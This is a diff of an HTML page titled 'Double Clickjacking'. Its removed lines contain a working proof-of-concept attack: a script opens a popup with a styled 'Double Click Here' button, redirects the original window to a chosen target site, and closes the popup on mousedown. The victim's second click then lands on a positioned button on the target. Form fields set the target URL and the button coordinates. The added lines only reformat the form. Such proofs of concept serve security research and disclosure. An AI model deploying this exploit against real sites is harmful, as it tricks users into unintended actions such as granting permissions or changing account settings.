@@ -3,99 +3,20 @@
           <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
     </head>
 <body>
-<script>
-function openDoubleWindow(url, top, left, width, height) {
-    console.log('URL:', url);
-    console.log('Top:', top);
-    console.log('Left:', left);
-    console.log('Width:', width);
-    console.log('Height:', height);
-     if (!url) {
-        console.error("URL is required for the hijack.");
-        return;
-    }
-    var evilWindow = window.open(window.location.protocol+"//"+
-  		window.location.hostname+":"+
-  		window.location.port+"/random", 
-  	"_blank");
-
-    evilWindow.onload = function() {
-        evilWindow.document.open();
-
-        //plugs the page to be hijacked as opener returnee
-        evilWindow.document.write(`
-            <script>
-            console.log('Hijacking opener to:', "${url}");
-            setTimeout(function() { 
-                opener.location = "${url}"; 
-            }, 1000);
-
-            </scri`+`pt>
-            
-            <div id="doubleclick" type="button" class="button" 
-                style="top: ${top}px; left: ${left}px; width: ${width}px; height: ${height}px; position: absolute; font-size: 16px; color: white; background-color: #3498db; box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.3); display: flex; justify-content: center; align-items: center; font-weight: bold; text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); cursor: pointer; border-radius: 20px; text-align: center; padding: 0 5px; transition: all 0.3s ease;" onmouseover="this.style.backgroundColor='#2980b9'; this.style.boxShadow='6px 6px 12px rgba(0, 0, 0, 0.4)'; this.style.transform='scale(1.05)';" 
-                onmouseout="this.style.backgroundColor='#3498db'; this.style.boxShadow='5px 5px 10px rgba(0, 0, 0, 0.3)'; this.style.transform='scale(1)';">Double Click Here</div>
-<script>
-      document.getElementById('doubleclick').addEventListener('mousedown', function() {
-       window.close();
-       });
-       </scr`+`ipt>`);
-        
-        evilWindow.document.close();
-    };
-}
-</script>
-<script>
-    function getDynamicUrl() {
-    const urlInput = document.getElementById("siteUrl").value;
-    return urlInput; // fallback URL if input is empty
-}
-    function getUpdown() {
-    const up = document.getElementById("Updown").value;
-    return up ? up : ""; // fallback URL if input is empty
-}
-    function getleftRight() {
-    const left = document.getElementById("leftRight").value;
-    return left ? left : ""; // fallback URL if input is empty
-}
-    function getwidth() {
-    const width = document.getElementById("width").value;
-    return width ? width : "" // fallback URL if input is empty
-}
-    function getheight() {
-    const height = document.getElementById("height").value;
-    return height ? height : "" // fallback URL if input is empty
-}
-</script>
-    <!-- Replace value's below with the URL and top, left, width, height of a button you want to doublejack with -->
     <form>
     <h2><b>Double Clickjacking</b></h2>
     <div class="form-row">
-    <div class="form-group col-md-6">
-    <label for="siteUrl">Enter the URL</label>
-    <input type="text" class="form-control" id="siteUrl" placeholder="Enter site URL" />
+        <div class="form-group col-md-6">
+            <label for="siteUrl">Enter the URL</label>
+            <input type="text" class="form-control" id="siteUrl" placeholder="Enter site URL" />
+        </div>
     </div>
     <div class="form-row">
-    <div class="form-group col-md-6">
-    <label for="Updown">Up or down</label>
-    <input type="text" class="form-control" id="Updown" placeholder="Up/Down" />
+        <div class="form-group col-md-6">
+            <label for="Updown">Up or down</label>
+            <input type="text" class="form-control" id="Updown" placeholder="Up/Down" />
+        </div>
     </div>
-        <div class="form-row">
-    <div class="form-group col-md-6">
-    <label for="leftRight">left or Right</label>
-    <input type="text" class="form-control" id="leftRight" placeholder="left/Right" />
-        </div>
-         <div class="form-row">
-    <div class="form-group col-md-6">
-    <label for="width">width</label>
-    <input type="text" class="form-control" id="width" placeholder="width" />
-        </div>
-         <div class="form-row">
-    <div class="form-group col-md-6">
-    <label for="height">height</label>
-    <input type="text" class="form-control" id="height" placeholder="height" />
-        </div>
-    <button onclick="openDoubleWindow(getDynamicUrl(),getUpdown(), getleftRight(), getwidth(), getheight())" class="btn btn-primary">Click Here</button>
     </form>
-
-</body></html>
+</body>
+</html>
